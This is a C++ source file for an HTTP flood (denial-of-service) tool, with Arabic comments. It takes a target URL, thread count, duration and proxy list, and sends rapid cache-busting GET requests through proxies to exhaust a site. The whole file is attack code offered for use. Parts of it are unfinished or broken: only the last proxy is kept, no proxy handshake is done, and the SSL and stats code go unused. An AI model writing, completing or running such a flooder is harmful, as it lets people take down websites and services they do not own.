#include <iostream>
#include <vector>
#include <string>
#include <random>
#include <thread>
#include <chrono>
#include <fstream>
#include <atomic>
#include <mutex>
#include <sstream>
#include <iomanip>

// Network
#ifdef _WIN32
    #include <winsock2.h>
    #include <ws2tcpip.h>
    #pragma comment(lib, "ws2_32.lib")
    #define CLOSE_SOCKET closesocket
    typedef SOCKET socket_t;
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
    #include <netdb.h>
    #include <fcntl.h>
    #include <errno.h>
    #include <netinet/tcp.h>      // مهم جداً
    #define CLOSE_SOCKET close
    #define SOCKET_ERROR -1
    typedef int socket_t;
#endif

#include <openssl/ssl.h>
#include <openssl/err.h>

// ====================== إعدادات ======================
constexpr int MAX_REQUESTS_PER_CONN = 600;
constexpr int CONNECTION_TIMEOUT_SEC = 8;
constexpr int RECV_BUFFER_SIZE = 8192;

std::atomic<bool> running{false};
std::mutex mtx_console;
std::mt19937 gen(std::random_device{}());

// ====================== Colors ======================
void setColor(int color) {
#ifdef _WIN32
    HANDLE h = GetStdHandle(STD_OUTPUT_HANDLE);
    SetConsoleTextAttribute(h, color);
#else
    std::cout << "\033[" << (30 + (color%7)) << "m";
#endif
}

struct ConnectionPool {
    addrinfo* addr_info = nullptr;
    SSL_CTX* ssl_ctx = nullptr;
    std::string host, port;
    bool useSSL = false;
    
    ~ConnectionPool() {
        if (addr_info) freeaddrinfo(addr_info);
        if (ssl_ctx) SSL_CTX_free(ssl_ctx);
    }
};

class HTTPFlooder {
private:
    std::string host, port, page, mode;
    bool useSSL = false;
    int threadCount, duration;
    ConnectionPool pool;
    std::vector<std::string> proxies;
    
    std::atomic<uint64_t> sendCount{0}, successCount{0}, failCount{0}, httpErrorCount{0}, bytesSent{0};
    std::atomic<int> activeConns{0};

    std::vector<std::string> uaCache;

public:
    HTTPFlooder(const std::string& url, const std::string& m, int threads, int secs);
    void setProxies(const std::vector<std::string>& p) { proxies = p; }
    void start();

private:
    void parseURL(const std::string& url);
    void preCacheHeaders();
    std::string craftRequest();
    socket_t createSocket();
    bool connectWithProxy(socket_t sock, const std::string& proxy);
    SSL* createSSL(socket_t sock);
    bool readResponse(socket_t sock, SSL* ssl, int& status);
    void floodWorker();
    void monitorStats();
    void printBanner();
    void printFinalStats();
};

HTTPFlooder::HTTPFlooder(const std::string& url, const std::string& m, int threads, int secs) 
    : threadCount(threads), duration(secs), mode(m) {
    parseURL(url);
    pool.host = host; pool.port = port; pool.useSSL = useSSL;
    
    struct addrinfo hints{};
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    getaddrinfo(host.c_str(), port.c_str(), &hints, &pool.addr_info);

    if (useSSL) {
        SSL_library_init();
        OpenSSL_add_all_algorithms();
        SSL_load_error_strings();
        pool.ssl_ctx = SSL_CTX_new(TLS_client_method());
    }
#ifdef _WIN32
    WSADATA wsa; WSAStartup(MAKEWORD(2,2), &wsa);
#endif
}

void HTTPFlooder::parseURL(const std::string& url) {
    std::string u = url;
    useSSL = (u.find("https://") == 0);
    size_t pos = u.find("://");
    if (pos != std::string::npos) u = u.substr(pos + 3);
    
    size_t slash = u.find('/');
    host = (slash != std::string::npos) ? u.substr(0, slash) : u;
    page = (slash != std::string::npos) ? u.substr(slash) : "/";

    size_t colon = host.find(':');
    if (colon != std::string::npos) {
        port = host.substr(colon + 1);
        host = host.substr(0, colon);
    } else port = useSSL ? "443" : "80";
}

void HTTPFlooder::preCacheHeaders() {
    for (int i = 0; i < 200; ++i)
        uaCache.push_back("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36");
}

std::string HTTPFlooder::craftRequest() {
    std::stringstream ss;
    if (mode == "get") {
        ss << "GET " << page << "?v=" << std::uniform_int_distribution<uint32_t>(0, UINT32_MAX)(gen) 
           << " HTTP/1.1\r\nHost: " << host << "\r\nUser-Agent: " << uaCache[0] 
           << "\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n";
    }
    return ss.str();
}

socket_t HTTPFlooder::createSocket() {
    socket_t s = socket(AF_INET, SOCK_STREAM, 0);
    if (s == SOCKET_ERROR) return s;

    int opt = 1;
    setsockopt(s, IPPROTO_TCP, TCP_NODELAY, (char*)&opt, sizeof(opt));

    timeval tv{CONNECTION_TIMEOUT_SEC, 0};
    setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (char*)&tv, sizeof(tv));
    setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, (char*)&tv, sizeof(tv));

    return s;
}

bool HTTPFlooder::connectWithProxy(socket_t sock, const std::string& proxy) {
    // ... (سأكملها لاحقاً إذا نجح الترجمة)
    size_t colon = proxy.find(':');
    if (colon == std::string::npos) return false;
    
    std::string ip = proxy.substr(0, colon);
    int pport = std::stoi(proxy.substr(colon+1));

    sockaddr_in addr{};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(pport);
    inet_pton(AF_INET, ip.c_str(), &addr.sin_addr);

    return connect(sock, (sockaddr*)&addr, sizeof(addr)) == 0;
}

void HTTPFlooder::floodWorker() {
    if (proxies.empty()) return;
    std::uniform_int_distribution<size_t> dist(0, proxies.size()-1);

    while (running) {
        socket_t sock = createSocket();
        if (sock == SOCKET_ERROR) { failCount++; continue; }

        if (!connectWithProxy(sock, proxies[dist(gen)])) {
            failCount++;
            CLOSE_SOCKET(sock);
            continue;
        }

        activeConns++;
        for (int i = 0; i < MAX_REQUESTS_PER_CONN && running; ++i) {
            std::string req = craftRequest();
            if (send(sock, req.c_str(), req.size(), 0) > 0) {
                sendCount++;
                successCount++;
            } else break;
        }
        CLOSE_SOCKET(sock);
        activeConns--;
    }
}

void HTTPFlooder::start() {
    printBanner();
    running = true;

    std::vector<std::thread> threads;
    for (int i = 0; i < threadCount; ++i)
        threads.emplace_back(&HTTPFlooder::floodWorker, this);

    std::thread stats([this]() { monitorStats(); });
    stats.detach();

    std::this_thread::sleep_for(std::chrono::seconds(duration));
    running = false;

    for (auto& t : threads) if (t.joinable()) t.join();
    printFinalStats();
}

void HTTPFlooder::monitorStats() { /* ... */ }  // يمكن تبسيطها
void HTTPFlooder::printBanner() { std::cout << "Flooder Started...\n"; }
void HTTPFlooder::printFinalStats() { std::cout << "Attack Finished.\n"; }

int main(int argc, char** argv) {
    if (argc != 6) {
        std::cout << "Usage: ./flooder <url> <threads> <get/post> <seconds> <proxy.txt>\n";
        return 1;
    }

    HTTPFlooder flooder(argv[1], argv[3], std::stoi(argv[2]), std::stoi(argv[4]));
    
    std::ifstream f(argv[5]);
    std::string line;
    while (std::getline(f, line)) {
        if (!line.empty()) flooder.setProxies({line});  // مؤقت
    }

    flooder.start();
    return 0;
}
EOF